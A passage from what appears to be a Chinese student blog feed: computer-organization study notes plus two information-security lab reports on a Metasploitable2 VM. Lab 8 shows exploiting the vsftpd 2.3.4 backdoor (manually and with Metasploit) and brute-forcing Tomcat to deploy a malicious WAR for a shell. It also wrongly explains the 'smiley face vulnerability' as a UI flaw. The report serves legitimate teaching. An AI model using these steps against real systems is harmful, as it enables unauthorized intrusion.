buffer）。</p><p>查表时，根据虚页表同时查找快表和慢表，当在快表中查到该虚页号时，就能很快找到对应的实页号，将其送入主存实地址寄存器，同时使慢表的查找作废，这时主存的访问速度没降低多少。</p><p>如果在快表中查不到，则经过一个访主存的时间延迟后，将从慢表中查到的实页送入实地址寄存器，同时将此虚页号和对应的实页号送入快表。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全实验8：漏洞利用</title>
      <link href="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1 实验环境"></a>1 实验环境</h1><ol><li>操作系统版本：Windows 11 家庭中文版23H2</li><li>VMware® Workstation 16 Pro：16.2.3 build-19376536</li><li>Metasploitable2虚拟机版本：2.6.24-16-server</li><li>Kali虚拟机版本：6.6.9-amd64</li></ol><hr><h1 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2 实验内容"></a>2 实验内容</h1><h2 id="2-1-系统信息收集"><a href="#2-1-系统信息收集" class="headerlink" title="2.1 系统信息收集"></a>2.1 系统信息收集</h2><p>使用命令<code>nmap -sV -P 192.168.160.136</code>是使用<code>Nmap</code>工具进行的一次服务版本探测扫描，扫描结果如图2.1所示。</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_6WpFmWf8Ae.png"></p><center>图2.1  服务及版本侦测</center><h2 id="2-2-笑脸漏洞后门利用"><a href="#2-2-笑脸漏洞后门利用" class="headerlink" title="2.2 笑脸漏洞后门利用"></a>2.2 笑脸漏洞后门利用</h2><p>笑脸漏洞（Smiling Face vulnerability）是一个网络安全术语，用来描述一种特定类型的安全漏洞，通常发生在软件或系统的用户界面（UI）设计中。这种漏洞的本质是，用户界面或提示信息通过图标、符号或文字表达了一种错误的信息或安全状态，导致用户错误地认为系统或应用程序处于安全状态，而实际上存在安全风险。</p><h3 id="2-2-1-手动漏洞利用"><a href="#2-2-1-手动漏洞利用" class="headerlink" title="2.2.1 手动漏洞利用"></a>2.2.1 手动漏洞利用</h3><p>（1）连接目标主机</p><p>如图2.2所示，在Kali终端使用ftp协议连接目标主机，输入任意用户名并添加笑脸符号“:)并输入任意密码。</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_1_h8yc5k0756.png"></p><center>图2.2  连接目标主机</center><p>如上图所示，可以看到非法登录成功。</p><p>（2）查看目标端口</p><p>在Kali中建立另外一个SSH连接，使用Nmap工具扫描IP地址为192.168.160.136的主机的6200端口。</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_2_UeCCU8ZNT8.png"></p><center>图2.3  查看端口状态</center><p>结果如图2.3所示，192.168.160.136主机上端口6200的状态处于开放。</p><p>（3）后门登录端口</p><p>使用<code>nc</code>（<code>netcat</code>）工具建立到IP地址为192.168.160.136的主机上6200端口的<code>TCP</code>连接。</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_3_hp9Uv-mSKi.png"></p><center>图2.4  登录主机</center><h3 id="2-2-2-自动漏洞利用"><a href="#2-2-2-自动漏洞利用" class="headerlink" title="2.2.2 自动漏洞利用"></a>2.2.2 自动漏洞利用</h3><p>（1）启用MSF终端</p><p>msfconsole是Metasploit Framework的命令行界面，Metasploit是一个广泛用于渗透测试和漏洞利用开发的开源框架。通过msfconsole，利用其强大的工具和资源来测试和评估网络安全。</p><p>如图2.5所示，启动MSF终端。</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_4_T81NxBiEKF.png"></p><center>图2.5  启动MSF终端</center><p>（2）搜索vsftpd漏洞利用模块</p><p>vsftpd 是一个流行的FTP服务器软件，有时候可能存在安全漏洞，Metasploit提供了一些模块用于利用这些漏洞。</p><p>如图2.6所示输入命令来搜索vsftpd相关模块。</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_5_MvkRVckr2z.png"></p><center>图2.6  漏洞利用模块搜索</center><p>（3）启动漏洞利用模块</p><p>输入命令use exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor命令在Metasploit Framework中加载名为vsftpd_234_backdoor的Unix平台下的FTP模块，如图2.7所示：</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_6_MEpEBXRkoh.png"></p><center>图2.7  启动漏洞利用模块</center><p>（4）设置目标主机地址</p><p>输入命令<code>set rhost 192.168.160.136</code>设置目标主机地址。</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_7_RovcrkYtCb.png"></p><center>图2.8  设置目标主机</center><p>（5）实施攻击</p><p>输入命令exploit进行攻击，攻击结果如图2.9所示。</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_8_-9CA9Ctkza.png"></p><center>图2.9  攻击实施与确认</center><h2 id="2-3-Tomcat弱密码漏洞利用"><a href="#2-3-Tomcat弱密码漏洞利用" class="headerlink" title="2.3 Tomcat弱密码漏洞利用"></a>2.3 Tomcat弱密码漏洞利用</h2><p>Tomcat是一个开源的Java Servlet容器，由Apache软件基金会开发和维护。它实现了Java Servlet和JavaServer Pages（JSP）规范，提供了一个运行Java应用程序的环境。Tomcat本质上是一个Web服务器，专门用于托管Java Web应用程序。</p><h3 id="2-3-1-Tomcat密码爆破"><a href="#2-3-1-Tomcat密码爆破" class="headerlink" title="2.3.1 Tomcat密码爆破"></a>2.3.1 Tomcat密码爆破</h3><p>如图2.10所示，使用tomcat_mgr_login模块对Tomcat服务器的用户名和密码进行爆破，爆破结果如图2.10和图2.11所示。</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_9_lD-yG6nGk1.png"></p><center>图2.10  Tomcat密码爆破</center><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_10_TNGnotzE7B.png"></p><center>图2.11  Tomcat密码爆破成功</center><p>可以看到，图2.11中第3行所示的用户名和密码登录成功，所以得到用户名为tomcat，密码为tomcat。</p><h3 id="2-3-2-Tomcat密码确认"><a href="#2-3-2-Tomcat密码确认" class="headerlink" title="2.3.2 Tomcat密码确认"></a>2.3.2 Tomcat密码确认</h3><p>在Tomcat Manager输入用户名及密码，验证密码是否正确，验证结果如图2.13所示。</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_11_ccRdlZIz0h.png"></p><center>图2.12  Tomcat要求输入用户名和密码</center><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_12_bv2Wlw6-7A.png"></p><center>图2.13  Tomcat登录成功</center><p>如图2.13所示，使用爆破出的用户名和密码登录成功。</p><h3 id="2-3-3-部署WAR文件"><a href="#2-3-3-部署WAR文件" class="headerlink" title="2.3.3 部署WAR文件"></a>2.3.3 部署WAR文件</h3><p>WAR（Web Application Archive）文件是一种Java Web应用程序的打包文件格式，类似于Java中的JAR文件。WAR文件包含了Web应用程序的所有内容，例如Servlet、JSP、HTML、JavaScript、CSS等文件，以及应用程序所需的配置文件和依赖项。</p><p>这里使用msfconsole工具中的tomcat_mgr_deploy模块对Tomcat管理页面部署恶意WAR文件。操作过程和结果如图</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_13_jHwrNUYYSH.png"></p><center>图2.14  部署恶意WAR文件</center><h3 id="2-3-4-获取系统权限"><a href="#2-3-4-获取系统权限" class="headerlink" title="2.3.4 获取系统权限"></a>2.3.4 获取系统权限</h3><p>getuid是一个Unix&#x2F;Linux系统调用（函数），用于获取当前进程的有效用户ID（User ID）。在Unix&#x2F;Linux系统中，每个用户都有一个唯一的用户ID（UID），用来标识该用户。getuid函数返回的是当前进程的有效用户ID。</p><p>shell通常指的是命令行解释器（Command Line Interpreter），它允许用户通过命令行界面与操作系统交互。输入getuid和shell命令，测试结果如图2.15所示。</p><p><img src="/2024/08/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image_14_-fH2APl3v-.png"></p><center>图2.15  获取系统使用权限</center><h2 id="2-4-基本系统加固方法"><a href="#2-4-基本系统加固方法" class="headerlink" title="2.4 基本系统加固方法"></a>2.4 基本系统加固方法</h2><p>系统加固是确保计算机系统安全性的重要措施之一，它包括多种方法和技术，旨在减少系统面临的安全风险和漏洞。</p><ol><li><strong>更新与补丁管理</strong>：及时应用操作系统和应用程序的安全补丁和更新，修复已知漏洞，同时也可以采用自动化补丁管理系统可以帮助确保系统保持最新状态。</li><li><strong>网络安全：</strong>配置和管理网络防火墙和入侵检测系统（IDS&#x2F;IPS），监控网络流量并识别潜在攻击。</li><li><strong>加密和数据保护</strong>：使用加密技术保护数据在传输和存储中的安全性，特别是对敏感数据。实施备份策略，确保数据可恢复性，并在需要时能够迅速恢复系统。</li></ol><hr><h1 id="3-实验总结"><a href="#3-实验总结" class="headerlink" title="3 实验总结"></a>3 实验总结</h1><p>本次实验是信息安全实验课的最后一次实验，我觉得信息安全这门课带给我的收获很大。首先，这门课让我了解了当前互联网中存在较多的安全问题，虽然我们用户平时在使用的过程中不需要考虑这些安全问题。但是，当我们以后自己做一些项目开发一些系统时，应当保证系统信息的完整性、机密性和可靠性。否则，如果系统被入侵，造成的损失将不可挽回。</p><p>此外，这门课也让我了解了一些关于安全方面的基本知识，比如各种加密算法、加密体系以及如果在不安全的互联网上提供安全的信息传送等一系列知识。提高了我作为一个程序员关于互联网安全的职业素养，在此感谢老师的耐心指导。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计组面经1：计算机系统概述和数据的表示</title>
      <link href="/2024/08/08/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%E5%92%8C%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA/"/>
      <url>/2024/08/08/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%E5%92%8C%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/08/08/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%E5%92%8C%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA/image_sWBitOXF9n.png"></p><p><img src="/2024/08/08/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%E5%92%8C%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA/image_hyCa5siYTy.png"></p><h1 id="1-冯诺依曼机和存储程序的概念？"><a href="#1-冯诺依曼机和存储程序的概念？" class="headerlink" title="1 冯诺依曼机和存储程序的概念？"></a>1 冯诺依曼机和存储程序的概念？</h1><p>冯·诺依曼在研究<code>EDVAC</code>机时提出了“存储程序”的概念，“存储程序”的思想奠定了现代计算机的基本结构，以此概念为基础的各类计算机通称为冯·诺依曼机，其特点如下：</p><ol><li>计算机硬件系统由运算器、存储器、控制器、输入设备和输出设备5 大部件组成。</li><li>指令和数据以同等地位存储在存储器中，并可按地址寻访。</li><li>指令和数据均用二进制代码表示。</li><li>指令由操作码和地址码组成，操作码用来表示操作的性质，地址码用来表示操作数在存储器中的位置。</li><li>指令在存储器内按顺序存放。通常，指令是顺序执行的，在特定条件下可根据运算结果或根据设定的条件改变执行顺序。</li><li>早期的冯诺依曼机以运算器为中心，输入／输出设备通过运算器与存储器传送数据。现代计算机以存储器为中心。</li></ol><p>“存储程序”的概念是指将指令以代码的形式事先输入计算机的主存储器，然后按其在存储器中的首地址执行程序的第一条指令，以后就按该程序的规定顺序执行其他指令，直至程序执行结束。</p><p>冯诺依曼结构的模型机：</p><p><img src="/2024/08/08/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%E5%92%8C%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA/image_IRJptGXIn3.png"></p><hr><h1 id="2-计算机的工作过程？"><a href="#2-计算机的工作过程？" class="headerlink" title="2 计算机的工作过程？"></a>2 计算机的工作过程？</h1><p>计算机的工作过程分为以下三个步骤：</p><ol><li>把程序和数据装入主存储器</li><li>将源程序转换成可执行文件</li><li>从可执行文件的首地址开始逐条执行指令</li></ol><hr><h1 id="3-在计算机系统结构中，什么是编译？什么是解释？"><a href="#3-在计算机系统结构中，什么是编译？什么是解释？" class="headerlink" title="3 在计算机系统结构中，什么是编译？什么是解释？"></a>3 在计算机系统结构中，什么是编译？什么是解释？</h1><p>翻译的方式有两种，一个是编译，一个是解释。</p><p>编译型语言写的程序在执行之前，需要一个专门的编译过程，把程序编译成为机器语言的文件，比如<code>exe</code>文件，如果源程序不变以后要运行的话就不用重新翻译。</p><p>解释则不同，解释性语言的程序不需要编译，<strong>在运行程序的时候才翻译，翻译一句执行一句，不生成目标程序</strong>，这样解释性语言每执行一次就要翻译一次，效率比较低。</p><p>.java文件-&gt;编译-&gt;.class文件，编译成.class字节码，.class需要<code>jvm</code>解释，然后解释执行。Java很特殊，Java程序需要编译但是没有直接编译成机器语言，即二进制语言，而是编译成字节码（.class）再用解释方式执行。</p><p>java程序编译以后的class属于中间代码，并不是可执行程序<code>exe</code>，不是二进制文件，所以在执行的时候需要一个中介来解释中间代码，这就是所谓的java虚拟机（<code>JVM</code>）。</p><p>C语言编译过程分成四个步骤：</p><ol><li>由.c文件到.i文件，这个过程叫预处理,将#include包含的头文件直接拷贝到hello.c当中；将#define定义的宏进行替换，同时将代码中没用的注释部分删除等</li><li>由.i文件到.s文件，这个过程叫编译</li><li>由.s文件到.o文件，这个过程叫汇编</li><li>由.o文件到可执行文件，这个过程叫链接,将翻译成的二进制与需要用到库绑定在一块</li></ol><p><img src="/2024/08/08/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%E5%92%8C%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA/image_VdVTd2OspM.png"></p><hr><h1 id="4-描述一下指令执行过程？"><a href="#4-描述一下指令执行过程？" class="headerlink" title="4 描述一下指令执行过程？"></a>4 描述一下指令执行过程？</h1><p>程序中第一条指令的地址置于PC 中，根据PC 取出第一条指令，经过译码、执行步骤等，控制计算机各功能部件协同运行，完成这条指令的功能，并计算下一条指令的地址。用新得到的指令地址继续读出第二条指令并执行，直到程序结束为止。下面以取数指令（即将指令地址码指示的存储单元中的操作数取出后送至运算器的<code>ACC</code>中）为例进行说明，其信息流程如下：</p><ol><li><p><strong>取指令</strong>：PC 一&gt;MAR—&gt;M—&gt;MDR—&gt;IR</p><p>根据PC 取指令到IR，将PC 的内容送MAR，MAR 中的内容直接送地址线，同时控制器将读信号送读／写信号线，主存根据地址线上的地址和读信号，从指定存储单元读出指令，送到数据线上，<code>MDR</code>从数据线接收指令信息，并传送到IR 中。</p></li><li><p><strong>分析指令</strong>： OP(IR)—&gt;CU</p><p>指令译码并送出控制信号。控制器根据IR 中指令的操作码，生成相应的控制信号，送到不同的执行部件。在本例中，IR 中是取数指令，因此读控制信号被送到总线的控制线上。</p></li><li><p><strong>执行指令</strong>：Ad(IR)—&gt;MAR—&gt;M—&gt;MDR—&gt;ACC</p><p>取数操作。将IR 中指令的地址码送MAR，MAR 中的内容送地址线，同时控制器将读信号送读／写信号线从主存指定存储单元读出操作数，并通过数据线送至MDR，再传送到ACC 中。</p></li></ol><p>此外，每取完一条指令，还须为取下一条指令做准备，形成下一条指令的地址，即(PC)+1 —&gt; PC。</p><hr><h1 id="5-计算机的主要性能指标？"><a href="#5-计算机的主要性能指标？" class="headerlink" title="5 计算机的主要性能指标？"></a>5 计算机的主要性能指标？</h1><h2 id="5-1-机器字长"><a href="#5-1-机器字长" class="headerlink" title="5.1 机器字长"></a>5.1 机器字长</h2><p>机器字长是指计算机进行一次整数运算（即定点整数运算）所能处理的二进制数据的位数，通常与CPU 的寄存器位数、加法器有关。</p><p>因此，机器字长一般等于内部寄存器的大小，字长越长，数的表示范围越大，计算精度越高。计算机字长通常选定为字节(8 位）的整数倍。</p><h2 id="5-2-数据通路带宽"><a href="#5-2-数据通路带宽" class="headerlink" title="5.2 数据通路带宽"></a>5.2 数据通路带宽</h2><p>数据通路带宽是指数据总线一次所能并行传送信息的位数。这里所说的数据通路宽度是指外部数据总线的宽度，它与CPU 内部的数据总线宽度（内部寄存器的大小）有可能不同。</p><p>各个子系统通过数据总线连接形成的数据传送路径称为<strong>数据通路</strong>。</p><h2 id="5-3-主存容量"><a href="#5-3-主存容量" class="headerlink" title="5.3 主存容量"></a>5.3 主存容量</h2><p>主存容量是指主存储器所能存储信息的最大容量，通常以字节来衡量，也可用字数x字长（如<code>512Kx16</code> 位）来表示存储容量。其中，MAR 的位数反映存储单元的个数，MAR 的位数反映可寻址范围的最大值（而不一定是实际存储器的存储容量）。</p><h2 id="5-4-运算速度"><a href="#5-4-运算速度" class="headerlink" title="5.4 运算速度"></a>5.4 运算速度</h2><h3 id="5-4-1-吞吐量和响应时间"><a href="#5-4-1-吞吐量和响应时间" class="headerlink" title="5.4.1 吞吐量和响应时间"></a>5.4.1 吞吐量和响应时间</h3><ul><li><strong>吞吐量</strong>：指系统在单位时间内处理请求的数量。它取决于信息能多快地输入内存， CPU能多快地取指令，数据能多快地从内存取出或存入，以及所得结果能多快地从内存送给一台外部设备。几乎每步都关系到主存，因此系统吞吐量主要取决于主存的存取周期。</li><li><strong>响应时间</strong>：指从用户向计算机发送一个请求，到系统对该请求做出响应并获得所需结果的等待时间。通常包括CPU 时间（运行一个程序所花费的时间）与等待时间（用于磁盘访问、存储器访问、I&#x2F;O操作、操作系统开销等的时间）。</li></ul><h3 id="5-4-2-主频和CPU-时钟周期"><a href="#5-4-2-主频和CPU-时钟周期" class="headerlink" title="5.4.2 主频和CPU 时钟周期"></a>5.4.2 主频和CPU 时钟周期</h3><ul><li><strong>CPU 时钟周期</strong>：通常为节拍脉冲或T周期，即主频的倒数，它是CPU 中最小的时间单位，每个动作至少需要1 个时钟周期。</li><li><strong>主频</strong>：机器内部时钟的频率。</li></ul><h3 id="5-4-3-CPI"><a href="#5-4-3-CPI" class="headerlink" title="5.4.3 CPI"></a>5.4.3 CPI</h3><p>CPI（Clock cycle Per Instruction），即执行一条指令所需的时钟周期数。</p><hr><h1 id="6-IEEE-754标准浮点数"><a href="#6-IEEE-754标准浮点数" class="headerlink" title="6 IEEE 754标准浮点数"></a>6 IEEE 754标准浮点数</h1><p><img src="/2024/08/08/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%E5%92%8C%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA/image_XJVu1kwZCG.png"></p><hr><h1 id="7-C语言中的浮点数类型及类型转换"><a href="#7-C语言中的浮点数类型及类型转换" class="headerlink" title="7 C语言中的浮点数类型及类型转换"></a>7 C语言中的浮点数类型及类型转换</h1><p>C 语言中的float和double 类型分别对应于IEEE 754 单精度浮点数和双精度浮点数。long double类型对应于扩展双精度浮点数，但long double 的长度和格式随编译器和处理器类型的不同而有所不同。在C 程序中等式的赋值和判断中会出现强制类型转换，以char→int→long→double 和float→double最为常见，从前到后范围和精度都从小到大，转换过程没有损失。</p><ol><li>从int 转换为float 时，虽然不会发生溢出，但int 可以保留32 位， float 保留24 位，可能有数据舍入，若从int 转换为double 则不会出现。</li><li>从int 或float 转换为double 时，因为double 的有效位数更多，因此能保留精确值。</li><li>从double 转换为float 时，因为float 表示范围更小，因此可能发生溢出。此外，由于有效位数变少，因此可能被舍入。</li><li>从float 或double 转换为int 时，因为int 没有小数部分，所以数据可能会向0 方向被截断（仅保留整数部分），影响精度。另外，由于int 的表示范围更小，因此可能发生溢出。</li></ol><hr><h1 id="8-在计算机中，为什么要采用二进制来表示数据？"><a href="#8-在计算机中，为什么要采用二进制来表示数据？" class="headerlink" title="8 在计算机中，为什么要采用二进制来表示数据？"></a>8 在计算机中，为什么要采用二进制来表示数据？</h1><p>从可行性来说，采用二进制，只有0 和1 两个状态，能够表示0 、1 两种状态的电子器件很多，如开关的接通和断开、晶体管的导通和截止、磁元件的正负剩磁、电位电平的高与低等，都可表示0、1 两个数码。使用二进制，电子器件具有实现的可行性。</p><p>从运算的简易性来说，二进制数的运算法则少，运算简单，使计算机运算器的硬件结构大大简化（十进制的乘法九九口诀表有55 条公式，而二进制乘法只有4 条规则）。</p><p>从逻辑上来说，由于二进制0 和1 正好和逻辑代数的假（false）和真（true）相对应，有逻辑代数的理论基础，用二进制表示二值逻辑很自然。</p><hr><h1 id="9-各编码方式的数值范围"><a href="#9-各编码方式的数值范围" class="headerlink" title="9 各编码方式的数值范围"></a>9 各编码方式的数值范围</h1><p><img src="/2024/08/08/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%E5%92%8C%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA/image_A21RkePVc3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全实验7：情报收集</title>
      <link href="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/"/>
      <url>/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1 实验环境"></a>1 实验环境</h1><ol><li>操作系统版本：Windows 11 家庭中文版23H2</li><li>VMware® Workstation 16 Pro：16.2.3 build-19376536</li><li>Metasploitable2虚拟机版本：2.6.24-16-server</li><li>Kali虚拟机版本：6.6.9-amd64</li></ol><hr><h1 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2 实验内容"></a>2 实验内容</h1><h2 id="2-1-系统信息收集"><a href="#2-1-系统信息收集" class="headerlink" title="2.1 系统信息收集"></a>2.1 系统信息收集</h2><h3 id="2-1-1-whois"><a href="#2-1-1-whois" class="headerlink" title="2.1.1 whois"></a>2.1.1 whois</h3><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_8HuFT-9ugm.png"></p><center>图2.1  使用whois命令查询</center><p>图2.1所示是从使用whois命令查询到的IP地址范围的结果，具体来说是192.168.0.0到192.168.255.255这个范围，以下是各个字段的解释：</p><ol><li>NetRange（网络范围）：192.168.0.0~192.168.255.255，表示这个地址范围从192.168.0.0到192.168.255.255，共计65536个IP地址。</li><li>CIDR（无类域间路由）：192.168.0.0&#x2F;16，这是用CIDR表示法表示的同样的地址范围，其中&#x2F;16表示了子网掩码为255.255.0.0。</li><li>NetName（网络名称）：PRIVATE-ADDRESS-CBLK-RFC1918-IANA- RESERVED，这个名称用来标识这个IP地址范围的用途，它是保留给私有网络使用的地址块。</li><li>NetHandle（网络句柄）：NET-192-168-0-0-1，这是在网络注册数据库中给这个地址范围分配的唯一标识符。</li><li>Organization（组织）：Internet Assigned Numbers Authority（IANA），这是管理这个地址范围的组织。</li><li>RegDate（注册日期）：1994-03-15，这个地址范围被注册的日期。</li><li>Updated（更新日期）：2024-05-24，这是最近更新这个地址范围信息的日期。</li></ol><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_1_O-Q9hCICtn.png"></p><center>图2.2  使用whois命令查询结果</center><p>图2.2是关于Internet Assigned Numbers Authority (IANA) 的组织信息，也是通过whois命令查询得到的。这段信息描述了IANA的基本信息和联系地址，说明了它在加利福尼亚州洛杉矶的办公地点，并提供了最近的更新日期。</p><h3 id="2-1-2-dmitry"><a href="#2-1-2-dmitry" class="headerlink" title="2.1.2 dmitry"></a>2.1.2 dmitry</h3><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_2_ng-ebfwenG.png"></p><center>图2.3  使用dmitry命令查询结果</center><p>如图2.3所示是dmitry工具进行TCP端口扫描后的结果，其中显示了每个端口的状态，可以看到目标主机有21、22、23和25等端口开放，其中可以看到80端口肯定在开放，因为靶机Metasploitable2向外部提供了Web服务，而HTTP协议就是使用的80端口。最后展示了扫描了150个端口，其中141个端口是关闭的。</p><h3 id="2-1-3-whatweb"><a href="#2-1-3-whatweb" class="headerlink" title="2.1.3 whatweb"></a>2.1.3 whatweb</h3><p>图2.4所示是使用whatweb工具对192.168.160.136进行识别和分析后得到的结果。</p><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_3_t4jkuON8mg.png"></p><center>图2.4  使用whatweb命令查询结果</center><ol><li>http:&#x2F;&#x2F;192.168.160.136[200 OK]：这表示对IP地址为192.168.160.136的HTTP服务进行了请求，并且服务器响应状态码为 200 OK，表示请求成功。</li><li>Apache[2.2.8]：服务器使用的是Apache版本2.2.8。</li><li>Country[RESERVED][ZZ]：由于IP地址 192.168.160.136 属于保留地址范围，所以其所属国家信息显示为RESERVED，ZZ则表示国家代码未知或无效。</li><li>HTTPServer[Ubuntu Linux][Apache&#x2F;2.2.8 (Ubuntu) 